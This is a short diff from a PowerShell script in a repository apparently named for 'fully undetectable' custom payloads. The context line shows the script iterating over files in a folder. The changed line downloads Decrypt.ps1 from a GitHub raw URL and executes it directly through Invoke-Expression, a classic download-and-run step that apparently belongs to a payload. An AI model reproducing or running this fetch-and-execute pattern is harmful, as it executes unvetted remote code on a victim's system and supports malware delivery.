@@ -72,4 +72,4 @@ Get-ChildItem -Path $folderPath -File | ForEach-Object {
 
 # # Download the Decrypt.ps1 script from GitHub
 # Invoke-WebRequest -Uri $decryptScriptUrl -OutFile $decryptScriptPath
-powershell start powershell -A 'Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1).Content'
+Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1).Content
